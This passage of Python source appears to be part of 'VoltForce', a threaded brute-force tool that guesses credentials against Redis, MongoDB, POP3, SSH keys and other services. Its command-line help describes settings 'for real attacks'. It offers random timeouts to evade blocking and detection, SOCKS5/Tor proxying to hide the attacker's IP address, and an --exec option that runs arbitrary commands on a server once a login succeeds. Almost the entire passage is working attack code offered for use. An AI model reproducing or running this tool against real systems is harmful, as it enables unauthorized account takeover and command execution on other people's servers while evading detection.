                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Redis PASSWORD FOUND {password}")
                 
                with self.connections_lock:
                    self.total_connections += 1
               
            
        except redis.exceptions.AuthenticationError as e:

            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing redis password {password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing Redis password {password}")
            self.total_connections += 1

        except redis.exceptions.ConnectionError as e: 

            self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to redis server on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to Redis server on {self.target_host}")
            self.total_connections += 1

        except redis.exceptions.TimeoutError as e:  

            self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"redis connection timeout on {self.target_host}"))   
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Redis connection timeout on {self.target_host}")
            self.total_connections += 1

        except redis.exceptions.ResponseError as e:  


            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"redis server requires no password on {Style.BRIGHT + Fore.GREEN + self.target_host}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [WARNING] [{self.mode.upper()}] Redis server requires no password on {self.target_host}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [WARNING] [{self.mode.upper()}] Redis server requires no password on {self.target_host}")
            self.total_connections += 1


        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"redis unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Redis unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
               

        

    def brute_mongodb(self,host : str,user : str,password : str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False

        try:

            if self.stoping_event.is_set():
                    return False

            self.mongodb_connection = MongoClient(
                        host,
                        self.port or 27017,
                        username=user,
                        password=password,
                        serverSelectionTimeoutMS=(self.get_timeout() or 10) * 1000
                    )

            self.stoping_event.set()
            self.mongodb_connection.server_info()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"mongodb credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MongoDB CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MongoDB CREDENTIALS FOUND {user}:{password}")
             
            with self.connections_lock:
                self.total_connections += 1
               
            self.check_flags(self.mongodb_connection,self.mongodb_connection.close)
                
        except pymongo.errors.OperationFailure as e:

            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing mongodb credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing MongoDB credentials {user}:{password}")
              
            with self.connections_lock:
                self.total_connections += 1
               

        except pymongo.errors.ServerSelectionTimeoutError as e: 
            
            self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to mongodb server on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to MongoDB server on {self.target_host}")
              
            with self.connections_lock:
                self.total_connections += 1
               

        except pymongo.errors.ConnectionFailure as e: 

             
            with self.connections_lock:
                self.total_connections += 1
               
            self.safe_print(self.render_text("ERR",Back.RED,f"mongodb connection failure on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [ERROR] [{self.mode.upper()}] MongoDB connection failure on {self.target_host}")

        except pymongo.errors.ConfigurationError as e:  
            
            self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"mongodb configuration error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] MongoDB configuration error: {e}")
              
            with self.connections_lock:
                self.total_connections += 1
               


        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"mongodb unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] MongoDB unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
               

        


    def brute_pop3(self,host : str,user : str,password : str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False
        
        try:

            if self.stoping_event.is_set():
                    return False

            self.pop_connection = poplib.POP3(host, self.port or 110, timeout=self.get_timeout() or 10)
            self.pop_connection.user(user)
            self.pop_connection.pass_(password)
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"pop3 credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] POP3 CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] POP3 CREDENTIALS FOUND {user}:{password}")
             
            with self.connections_lock:
                self.total_connections += 1
               
            self.check_flags(self.pop_connection, self.pop_connection.quit)
                
        except poplib.error_proto as e:  
            err = str(e).lower()

            if "authentication" in err or "invalid" in err or "denied" in err:
                
                self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing pop3 credentials {user}:{password}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing pop3 credentials {user}:{password}")

            elif "locked" in err or "too many" in err:  
                
                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"pop3 account locked or too many attempts: {user}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [WARNING] [{self.mode.upper()}] POP3 account locked or too many attempts: {user}")

            else:  

                self.safe_print(self.render_text("ERR",Back.RED,f"pop3 protocol error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] POP3 protocol error: {e}")

            self.total_connections += 1

        except ConnectionRefusedError:  
            
            self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to pop3 server on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to POP3 server on {self.target_host}")
            self.total_connections += 1

        except socket.timeout:  
            
            self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"pop3 connection timeout on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] POP3 connection timeout on {self.target_host}")
            self.total_connections += 1


    
        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"pop3 unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] POP3 unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
               





    def brute_ssh_with_keys(self,host : str,user : str,key : str) -> bool:

        try:

            if self.output_file:
                paramiko.util.log_to_file(self.output_file)

            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing SSH key: {key} with username: {user}")
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing ssh key: {key} with username: {user}"))
            
            if self.stoping_event.is_set():
                    return False
            
            self.ssh_client.connect(hostname=host,
                                            port=self.port,
                                            username=user,
                                            pkey=paramiko.pkey.PKey.from_private_key_file(key),
                                            timeout=self.get_timeout() or 30
                                            )
            
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"ssh key on username: {Style.BRIGHT + Fore.GREEN + user} found {Style.BRIGHT + Fore.GREEN + key}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH key on username: {Style.BRIGHT + Fore.GREEN + user} found {Style.BRIGHT + Fore.GREEN + key}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH key on username: {Style.BRIGHT + Fore.GREEN + user} found {Style.BRIGHT + Fore.GREEN + key}")
             
            with self.connections_lock:
                self.total_connections += 1
               
            self.check_flags(self.ssh_client,self.ssh_client.close())

        except paramiko.AuthenticationException as e:
             
            with self.connections_lock:
                self.total_connections += 1
               

        finally:

            if self.ssh_client:
                self.ssh_client.close()


    


    def logging(self, string) -> bool:

        if not self.output_file:  
            return False
    
        try:

            with open(self.output_file, self.log_mode or "a", encoding="utf-8") as log_file:
                log_file.write(f"{string}\n")
            return True
        
        except Exception:
            return False
        
        
       
    def main(self):
            
            try:
            
            
                if self.banner:

                    print(self.title)
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [BANNER] [{self.mode.upper()}] Show banner and end work")
                    time.sleep(2)
                    sys.exit(0)
                

                if self.no_banner:

                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [NO BUNNER] [{self.mode.upper()}] Skip banner")

                else:
                    print(self.title)
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [STARTING] [{self.mode.upper()}] VoltForce starts")

                if self.delay == 0:

                    time.sleep(self.get_timeout())
                    

                else:

                    print(self.render_text("DEL", Style.BRIGHT + Fore.MAGENTA, f"{self.delay} second delay before starting work"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DELAY] [{self.mode.upper()}] {self.delay} second delay before starting work")
                    time.sleep(self.delay)


                if self.threads > 10:

                    self.progress_bar = False
                    print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"progress bar was disabled because it would not function correctly due to the large number of threads"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] progress bar was disabled because it would not function correctly due to the large number of threads")

                if self.no_duplicates:
                    self.remove_duplicates()

                if self.min_length_username or self.max_length_username or self.min_length_password or self.max_length_password:
                    self.sort_data()


                if self.reverse_usernames:

                    self.usernames_list.reverse()
                    print(self.render_text("REV", Fore.CYAN, "usernames wordlist reversed"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSED] [{self.mode.upper()}] usernames wordlist reversed")

                if self.reverse_passwords:

                    self.passwords_list.reverse()
                    print(self.render_text("REV", Fore.CYAN, "passwords wordlist reversed"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSED] [{self.mode.upper()}] passwords wordlist reversed")


                if self.timer:

                    self.start_timer = time.time()
                    time.sleep(self.get_timeout())


                if self.no_progress_bar:

                    self.progress_bar = False
                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"progress bar disabled"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] progress bar disabled")
                    time.sleep(self.get_timeout())


                if self.no_log:

                    self.output_file = False
                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"log was disabled"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] log was disabled")
                    time.sleep(self.get_timeout())


                if self.shuffle_seed:
                    
                    seed(self.shuffle_seed)
                    print(self.render_text("SEED", Style.BRIGHT + Fore.CYAN, f"new seed installed: {self.shuffle_seed}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SEED] [{self.mode.upper()}] new seed installed: {self.shuffle_seed}")
                    time.sleep(self.get_timeout())

                if self.is_shuffle:

                    print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"shuffle the wordlist {self.shuffle_count} times..."))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SHUFFLE] [{self.mode.upper()}] shuffle the wordlist {self.shuffle_count} times...")
                    time.sleep(self.get_timeout())

                    if self.shuffle_count < 1:
                        self.shuffle_count = 1

                    for _ in range(self.shuffle_count):

                        shuffle(self.usernames_list)
                        shuffle(self.passwords_list)

                if self.socks5_address and self.socks5_port:
                    print(self.render_text("INF", Fore.GREEN, f"socks5 proxy enabled: {self.socks5_address}:{self.socks5_port} ({self.socks5_username}:{self.socks5_password})"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] SOCKS5 proxy enabled: {self.socks5_address}:{self.socks5_port} ({self.socks5_username}:{self.socks5_password})")
                    time.sleep(self.get_timeout())

                self.tasks = []
                for host in self.hosts:
                    for user in self.usernames_list:
                        for password in self.passwords_list:
                            self.tasks.append((host, user, password))

                print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"starting {self.threads} threads..."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] starting {self.threads} threads...")
                time.sleep(self.get_timeout())

                executor = None

                with ThreadPoolExecutor(max_workers=self.threads) as executor:

                    self.futures = [executor.submit(self.make_worker, h, u, p) for h, u, p in self.tasks]
                    
                    if self.progress_bar:
                        with tqdm(total=len(self.tasks), colour="blue", desc="Brute forcing", unit="attempt", dynamic_ncols=True) as pbar:
                            for future in as_completed(self.futures):
                                pbar.update(1)
                    else:

                        for future in as_completed(self.futures):
                            pass


                if self.stoping_event.is_set():

                    executor.shutdown(wait=False, cancel_futures=True)

                else:

                    for _ in as_completed(self.futures):
                        pass

                print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,f"voltforce has completed its work successfully"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Volt Force has completed its work successfully")


            except KeyboardInterrupt:

                if executor:
                    executor.shutdown(wait=False, cancel_futures=True)

                print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"voltforce was terminated by the user"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] voltforce was terminated by the user")
                sys.exit(0)
            
            finally:



                if self.timer and self.start_timer is not None:

                    print(self.render_text("TIM", Fore.CYAN, f"execution time: {time.time() - self.start_timer:.2f} seconds"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TIMER] [{self.mode.upper()}] execution time: {time.time() - self.start_timer} seconds")
        
            




        
if __name__ == "__main__":


    
    
    parser = argparse.ArgumentParser(description="Volt Force is a brute-force tool for Python with support for over 20 protocols.")
    parser.add_argument("--host", type=str, help="Target host for attack") 
    parser.add_argument("-P", "--passwords-list", type=str, help="A list of passwords to be tried. The list should contain passwords in a column. If you only need to specify one password, create a list with only one password or use --single-password flag") 
    parser.add_argument("-U", "--usernames-list",type=str,  help="List of usernames to check. The list must contain usernames in the column. If you only need to specify one username, create a list with only one username or user --single-username flag") 
    parser.add_argument("-t", "--timeout", type=float,default=0.1,help="Timeout between connection attempts in seconds. For real attacks, it's best to set it to at least 60 seconds.The initial value is 0.1 seconds") 
    parser.add_argument("-siu", "--single-username", type=str, help="This flag is used to specify the username for brute-force attacks. Knowing the username will speed up the brute-force attack.") 
    parser.add_argument("-sip", "--single-password",type=str, help="This flag is used to specify the password. If you know the password but not the username, you can speed up the brute-force attack. Can be combined with the --single-username flag.") 
    parser.add_argument("-G", "--general-wordlist",type=str,  help="This flag is used to specify wordlists that store values ​​line by line in the 'username:password' format. Simply put, this flag is used to specify usernames and passwords in a single wordlist, separated by colons. If, for example, you're using brute-force attacks with SSH keys, simply specify the path to the target key file instead of the password. After specifying this flag, you don't need to specify the -P or -U flags. Important note: VoltForce will load all passwords line by line, so it will take time for VoltForce to load all the data.") 
    parser.add_argument("-sr", "--save-results",type=str, help="This flag is used to save successful connection attempts to a target file. Simply specify the path to the file, and VoltForce will save the credentials to the file.") 
    parser.add_argument("-d", "--delay",type=float,default=0,help="Delay before starting work in seconds") 
    parser.add_argument("-shu","--shuffle", action="store_true", help="Shuffle wordlists before starting")
    parser.add_argument("-shuc","--shuffle-count", type=int, default=10, help="This flag controls how many times to mix the password. By default, VoltForce mixes passwords 10 times, but you can change this value using this flag. The more times you mix the passwords, the higher the entropy level will be.")
    parser.add_argument("--seed","--shuffle-seed", type=int, help="A flag is used to specify a custom seed for shuffling. Specify an integer, and shuffling will work the same way. If your integer (seed) doesn't change, the shuffling result won't change either. The flag is needed either to uniquely arrange the wordlist. Therefore, if your seed won't change, there's no point in shuffling the wordlist more than once. Use the flag only for unambiguous shuffling. If you specify an insufficiently unique number, the shuffling can be predicted. Use the flag at your own risk and only if you are absolutely certain of the uniqueness of your seed.")
    parser.add_argument("-q","--quiet", action="store_true", help="Disables all console output. VoltForce won't notify you of any messages, but this mode enables logging, and all data will be written there.")
    parser.add_argument("-b","--banner", action="store_true", help="Show banner and exit")
    parser.add_argument("-thr", "--threads", type=int,default=5,help="The number of threads to be checked. The higher the number of threads, the more noise and activity will be in the logs, and the more load you will place on your operating system. The initial value is 10 threads.") 
    parser.add_argument("-pb", "--progress-bar", action="store_true", help="Progress bar to show the process of searching and counting the number of combinations.") 
    parser.add_argument("-npb", "--no-progress-bar", action="store_true", help="Forces the progress bar to be disabled if someone changes the tool's values ​​or decides not to include it. When this flag is set, progress_bar will be set to False, and it will no longer be active.") 
    parser.add_argument("-p", "--port", type=int, help="Specifies the port for further connections. Brute-force functions use default ports for connections; for example, SSH uses port 22. However, a service may use a non-standard port, so this flag is used to specify a specific port for testing.") 
    parser.add_argument("-mr", "--max-retries", type=int,default=None,help="This setting controls the maximum number of connection attempts to the host. Once the maximum number of connection attempts is reached, VoltForce will shut down. This feature is disabled by default.") 
    parser.add_argument("-o", "--output-file",nargs="?", const="auto",help="This parameter is responsible for logging all program actions.") 
    parser.add_argument("-nl","--no-log", action="store_true", help="Forces logging to be disabled if someone changes the tool's values ​​or decides not to enable logging. When this flag is set, the output_file value will be set to False, and logging will be disabled.")
    parser.add_argument("-ko", "--keep-open",  action="store_true" ,help="This flag ensures that we don't close the connection after the first login credentials are detected. Specifying this flag will save you connection time.") 
    parser.add_argument("-e", "--exec","--execute",  type=str ,help="This flag is used to execute arbitrary commands after gaining privileges. Specify a command that VoltForce will execute immediately after receiving the required data. After specifying the flag, VoltForce will execute arbitrary code and exit, closing the connection and sending a response from the server. To keep the connection open after executing the code, specify the --keep-open flag.")
    parser.add_argument("-rt", "--random-timeout", type=str,default=None,help="This flag is used to specify a range of values ​​that will be selected using cryptographically strong randomness based on the entropy of your OS and used as a random timeout. This is necessary to avoid blocking detection systems. VoltForce itself will not participate in random number selection, making it more difficult to predict. The value specified by this flag will be substituted for the standard --timeout flag.") 
    parser.add_argument("-ht", "--host-timeout", type=float,default=None,help="This flag controls the timeout between host tests. If you're testing more than one host, after testing one host, there will be a delay of the specified number of seconds before testing the next host.") 
    parser.add_argument("-ie", "--ignore-errors",  action="store_true" ,help="This flag is used to ignore errors. If this flag is enabled, VoltForce will stop displaying any error or warning messages and continue running.") 
    parser.add_argument("-so", "--success-only",  action="store_true" ,help="This flag is used to output only successful data search attempts to the console. If you specify this flag, Volt Force will not display any messages about testing any credentials. If you specify this flag, the program may appear to hang. However, the brute-force process will still continue.") 
    parser.add_argument("-mt", "--max-time",type=float, help="Maximum operating time") 
    parser.add_argument("-nc", "--no-color", action="store_true", help="Color output will be disabled") 
    parser.add_argument("-m", "--mode",choices=["ssh", "ftp","smb","telnet", "mysql","postgres","redis","mongodb", "pop3","ssh-key"] , type=str , default="ssh" , help="The tool's operating mode. By default, the search mode is SSH.") 
    parser.add_argument("--log-mode", choices=["w", "a"], default="a", help="Log mode: w = overwrite, a = append") 
    parser.add_argument("-H", "--hosts-list", type=str, help="list of hosts in the file. To specify targets. Hosts should be specified in a column.") 
    parser.add_argument("-sk","--ssh-key", type=str , help="This flag is used to specify the SSH authorization key. You only need to specify the path to the key file. You must also select the ssh-key mode using the --mode flag. This flag will only use one key. For brute-force attacks, use the --keys-list flag. If you want to use a brute-force attack on keys, you don't need to specify a password list. VoltForce will fill them in automatically, so you don't need to specify them. Simply specify the --ssh-key flag.")
    parser.add_argument("-kl","--keys-list", type=str , help="This flag is used to specify a file containing a list of paths to keys for SSH authentication. The flag should contain a wordlist containing file paths in a column. To enable brute-force mode using SSH keys, enable it using the mode flag. If you know the SSH key, specify only the path to the key in the dictionary or use the --ssh-key flag.If you want to use a brute-force attack, you don't need to specify a password list. VoltForce will fill them in automatically, so you don't need to enter them manually. Simply specify the --keys-list flag.") 
    parser.add_argument("-nb","--no-banner", action="store_true", help="Don't show the banner")
    parser.add_argument("-sa","--socks5-address", type=str , help="A flag for specifying a SOCKS5 proxy address that hides the real IP address. To connect, you must specify an IP address. If you want to use the TOR network as a SOCKS5 proxy, first start the TOR service itself and then specify the address 127.0.0.1.") 
    parser.add_argument("-sp","--socks5-port", type=int , help="Parameter for specifying the SOCKS5 proxy port. If you want to use the Tor network as a proxy, first start the Tor service and then specify port 9050.") 
    parser.add_argument("-su","--socks5-username", type=str ,default=None, help="Flag for specifying the username for the SOCKS5 proxy. If your SOCKS5 proxy doesn't require a username (for example, when using a SOCKS5 proxy for the Tor network), do not specify this parameter.") 
    parser.add_argument("-spas","--socks5-password", type=str ,default=None, help="Flag for specifying a password for the SOCKS5 proxy. If your SOCKS5 proxy does not require a password (for example, when using a SOCKS5 proxy for the Tor network), do not specify this parameter.") 
    parser.add_argument("-s", "--stop-on-success", action="store_true", help="Stops the program after finding at least one login and password") 
    parser.add_argument("-time","--timer", action="store_true", help="Show execution time at the end")
    parser.add_argument("-ru","--reverse-usernames", action="store_true", help="Reverse the usernames wordlist order")
    parser.add_argument("-rp","--reverse-passwords", action="store_true", help="Reverse the passwords wordlist order")
    parser.add_argument("--min-length-username", type=int, help="Minimum username length to try")
    parser.add_argument("--max-length-username", type=int, help="Maximum username length to try")
    parser.add_argument("--min-length-password", type=int, help="Minimum password length to try")
    parser.add_argument("--max-length-password", type=int, help="Maximum password length to try")
    parser.add_argument("-nd","--no-duplicates", action="store_true", help="Remove duplicate entries from wordlists")
    parser.add_argument("-db","--delay-between", type=float, default=0, help="Delay between attempts on the same host (seconds)")

    args = parser.parse_args()

    log_filename = None

    if args.output_file == "auto":  

        log_filename = f"./logs/{datetime.datetime.now().strftime('%d_%m_%Y_%H_%M_%S')}_logs.txt"

    elif args.output_file:  

        log_filename = args.output_file

    voltforce = VoltForce(

        target_host=args.host,
        passwords_list=args.passwords_list,
        usernames_list=args.usernames_list,
        single_password=args.single_password,
        single_username=args.single_username,
        timeout=args.timeout,
        threads=args.threads,
        progress_bar=args.progress_bar,
        no_progress_bar=args.no_progress_bar,
        port=args.port or 22,
        max_retries=args.max_retries,
        output_file=log_filename,
        no_log = args.no_log,
        max_time=args.max_time,
        mode=args.mode,
        log_mode=args.log_mode,
        stop_on_success=args.stop_on_success,
        socks5_address=args.socks5_address,
        socks5_port=args.socks5_port,
        socks5_username=args.socks5_username,
        socks5_password=args.socks5_password,
        hosts_list=args.hosts_list,
        no_color=args.no_color,
        ssh_key=args.ssh_key,
        keys_list=args.keys_list,
        random_timeout = args.random_timeout,
        host_timeout = args.host_timeout,
        ignore_errors = args.ignore_errors,
        success_only = args.success_only,
        delay=args.delay,
        is_shuffle=args.shuffle,
        shuffle_count=args.shuffle_count,
        shuffle_seed=args.seed,
        quiet=args.quiet,
        banner=args.banner,
        save_results=args.save_results,
        general_wordlist=args.general_wordlist,
        keep_open=args.keep_open,
        exec=args.exec,
        no_banner=args.no_banner,
        timer=args.timer,
        reverse_usernames=args.reverse_usernames,
        reverse_passwords=args.reverse_passwords,
        min_length_username = args.min_length_username,
        max_length_username = args.max_length_username,
        min_length_password = args.min_length_password,
        max_length_password = args.max_length_password,
        no_duplicates = args.no_duplicates,
        delay_between = args.delay_between



)
    voltforce.main()
                                    


    